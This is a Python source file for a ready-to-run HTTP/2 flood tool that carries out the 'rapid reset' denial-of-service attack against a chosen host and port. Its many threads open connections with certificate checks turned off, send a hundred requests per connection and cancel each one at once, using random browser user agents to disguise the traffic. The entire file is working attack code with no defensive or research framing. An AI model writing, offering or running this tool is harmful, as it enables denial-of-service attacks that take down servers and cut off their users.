import socket
import ssl
import threading
import time
import random
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, StreamEnded

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
]

class HTTP2Flood:
    def __init__(self, target, port, threads, duration, spoof=False, use_https=True):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = threading.Event()
        self.use_https = use_https
        self.lock = threading.Lock()
        self.request_count = 0

    def _attack(self):
        while not self.stop_event.is_set():
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target, self.port))
                if self.use_https:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.target)

                config = H2Configuration(client_side=True)
                conn = H2Connection(config=config)
                conn.initiate_connection()
                sock.sendall(conn.data_to_send())

                # Send multiple streams rapidly and then reset them
                for _ in range(100):
                    stream_id = conn.get_next_available_stream_id()
                    conn.send_headers(
                        stream_id,
                        [
                            (':method', 'GET'),
                            (':path', '/'),
                            (':scheme', 'https' if self.use_https else 'http'),
                            (':authority', self.target),
                            ('user-agent', random.choice(DEFAULT_USER_AGENTS)),
                        ],
                        end_stream=True,
                    )
                    sock.sendall(conn.data_to_send())
                    # Immediately reset the stream
                    conn.reset_stream(stream_id)
                    sock.sendall(conn.data_to_send())
                    with self.lock:
                        self.request_count += 1

                sock.close()
            except ImportError:
                print("[!] h2 library belum diinstall. Jalankan: pip install h2")
                return
            except Exception:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False, use_https=True):
    flood = HTTP2Flood(target, port, threads, duration, spoof, use_https)
    flood.start()
